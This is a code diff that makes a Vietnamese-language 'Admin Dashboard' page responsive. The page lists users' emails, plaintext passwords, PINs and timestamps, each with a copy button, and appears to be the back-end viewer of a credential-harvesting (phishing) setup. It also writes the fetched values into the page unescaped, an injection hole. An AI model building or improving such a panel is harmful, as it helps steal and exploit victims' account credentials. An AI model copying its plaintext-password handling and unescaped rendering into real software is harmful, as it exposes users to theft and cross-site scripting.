@@ -41,27 +41,29 @@
         }
     </style>
 </head>
-<body class="p-10">
-<h1 class="text-3xl font-bold mb-6 text-gray-800">👑 Admin Dashboard</h1>
+<body class="bg-gray-100 px-4 py-6 md:px-10">
+<h1 class="text-2xl md:text-3xl font-bold mb-6 text-gray-800 text-center md:text-left">👑 Admin Dashboard</h1>
 
-<div class="bg-white shadow-md rounded-lg overflow-hidden">
+<!-- bảng cuộn ngang khi trên mobile -->
+<div class="bg-white shadow-md rounded-lg overflow-x-auto w-full">
     <table class="min-w-full table-auto text-sm">
         <thead class="bg-gray-100 text-gray-700 uppercase text-xs">
         <tr>
-            <th class="px-6 py-3 text-left">Email</th>
-            <th class="px-6 py-3 text-left">Password</th>
-            <th class="px-6 py-3 text-left">PIN</th>
-            <th class="px-6 py-3 text-left">Thời gian</th>
+            <th class="px-4 py-3 text-left">Email</th>
+            <th class="px-4 py-3 text-left">Password</th>
+            <th class="px-4 py-3 text-left">PIN</th>
+            <th class="px-4 py-3 text-left">Thời gian</th>
         </tr>
         </thead>
         <tbody id="user-table-body" class="text-gray-800 divide-y">
         </tbody>
     </table>
+</div>
 
-    <div class="p-4 flex justify-center items-center gap-4" id="pagination-controls">
-        <button id="prev-btn" class="pagination-btn">← Trang trước</button>
-        <button id="next-btn" class="pagination-btn">Trang sau →</button>
-    </div>
+<!-- pagination responsive -->
+<div class="p-4 flex flex-wrap justify-center items-center gap-3 mt-4" id="pagination-controls">
+    <button id="prev-btn" class="pagination-btn">← Trang trước</button>
+    <button id="next-btn" class="pagination-btn">Trang sau →</button>
 </div>
 
 <script>
@@ -82,25 +84,25 @@
             res.data.forEach((user, index) => {
                 html += `
                     <tr>
-                        <td class="px-6 py-4">
+                        <td class="px-4 py-4">
                             <span class="inline-flex items-center gap-x-1">
                                 <span id="email${index}">${user.email}</span>
                                 <span class="copy-icon" onclick="copyToClipboard('email${index}')">📋</span>
                             </span>
                         </td>
-                        <td class="px-6 py-4">
+                        <td class="px-4 py-4">
                             <span class="inline-flex items-center gap-x-1">
                                 <span id="password${index}">${user.password}</span>
                                 <span class="copy-icon" onclick="copyToClipboard('password${index}')">📋</span>
                             </span>
                         </td>
-                        <td class="px-6 py-4">
+                        <td class="px-4 py-4">
                             <span class="inline-flex items-center gap-x-1">
                                 <span id="pin${index}">${user.pin}</span>
                                 <span class="copy-icon" onclick="copyToClipboard('pin${index}')">📋</span>
                             </span>
                         </td>
-                        <td class="px-6 py-4">
+                        <td class="px-4 py-4">
                             <span class="time-label">${user.created_at}</span>
                         </td>
                     </tr>`;
